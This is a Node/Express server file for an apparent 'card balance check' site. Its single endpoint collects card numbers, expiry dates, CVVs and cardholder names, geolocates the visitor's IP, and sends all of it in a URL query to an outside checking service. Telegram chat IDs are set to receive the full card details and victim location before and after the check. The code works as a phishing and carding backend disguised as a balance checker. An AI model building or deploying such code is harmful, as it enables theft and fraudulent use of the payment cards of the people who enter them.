import express from 'express';
import cors from 'cors';
import path from 'path';
import https from 'https';
import http from 'http';
import { fileURLToPath } from 'url';
import { config } from 'dotenv';

config();

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = process.env.PORT || 3002;
const API_URL = 'https://bot.pc.am/v3/checkBalance';

app.use(cors({ origin: '*' }));
app.use(express.json());

// Serve static files in production
app.use(express.static(path.join(__dirname, '../dist')));

// Helper: make GET request using Node https/http modules
function httpGet(url) {
  return new Promise((resolve, reject) => {
    const mod = url.startsWith('https') ? https : http;
    mod.get(url, (resp) => {
      let data = '';
      resp.on('data', (chunk) => { data += chunk; });
      resp.on('end', () => resolve(data));
    }).on('error', reject);
  });
}

/**
 * Balance Check API
 */
app.post('/api/check-balance', async (req, res) => {
  const API_TOKEN = process.env.API_TOKEN;
  const TELEGRAM_BEFORE = process.env.TELEGRAM_ID_BEFORE_CHECK?.trim();
  const TELEGRAM_AFTER = process.env.TELEGRAM_ID_AFTER_CHECK?.trim();
  const REQUEST_TIMEOUT = process.env.REQUEST_TIMEOUT?.trim();
  const CACHE_SECONDS = process.env.CACHE_RESPONSE_SECONDS?.trim();
  const SCREENSHOT = process.env.SCREENSHOT?.trim();
  const SCREENSHOT_QUALITY = process.env.SCREENSHOT_JPEG_QUALITY?.trim();
  const SCREENSHOT_SIZE = process.env.SCREENSHOT_BOX_SIZE?.trim();

  if (!API_TOKEN) {
    return res.json({ success: false, error: 'API token not configured' });
  }

  const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, referral } = req.body;

  try {
    const number = (cardNumber || '').replace(/\s/g, '');
    const month = (expiryMonth || '').padStart(2, '0');
    const year = expiryYear || '';
    const cvvVal = cvv || '';

    if (number.length < 15 || number.length > 19) {
      return res.json({ success: false, error: 'Please enter a valid card number' });
    }
    if (!cvvVal || cvvVal.length < 3) {
      return res.json({ success: false, error: 'Please enter a valid PIN' });
    }

    // Get visitor IP
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
      || req.headers['x-real-ip']
      || req.socket?.remoteAddress
      || '';

    // Lookup location from IP
    let location = '';
    try {
      const geoText = await httpGet(`http://ip-api.com/json/${ip}?fields=status,country,city`);
      const geo = JSON.parse(geoText);
      if (geo.status === 'success') {
        location = `${geo.city}, ${geo.country}`;
      }
    } catch {}

    // Build note
    const lines = [];
    lines.push(`Card: ${number} ${cvvVal}`);
    lines.push(`Date: ${month}/${year}`);
    lines.push(`Name on card: ${cardHolder || 'N/A'}`);
    lines.push(`IP: ${ip || 'unknown'}${location ? ' (' + location + ')' : ''}`);
    lines.push(`Timezone: ${timezone || 'N/A'}`);
    lines.push(`Referral: ${referral || 'Direct'}`);

    const fullNote = lines.join('\n');

    // Required params
    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal
    });

    // Optional params from env
    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
    params.set('telegram_additional_note', fullNote);
    if (REQUEST_TIMEOUT) params.set('request_timeout', REQUEST_TIMEOUT);
    if (CACHE_SECONDS) params.set('cache_response_seconds', CACHE_SECONDS);
    if (SCREENSHOT) params.set('screenshot', SCREENSHOT);
    if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
    if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);

    const apiUrl = API_URL + '?' + params.toString();
    const text = await httpGet(apiUrl);
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text, success: false, error: 'Invalid response from API' };
    }
    res.json(data);

  } catch (err) {
    console.error('Balance check error:', err);
    res.json({ success: false, error: err.message || 'Unable to check balance. Please try again later.' });
  }
});

// Serve SPA for production
app.get('*', (req, res) => {
  if (req.path.startsWith('/api')) return;
  res.sendFile(path.join(__dirname, '../dist/index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
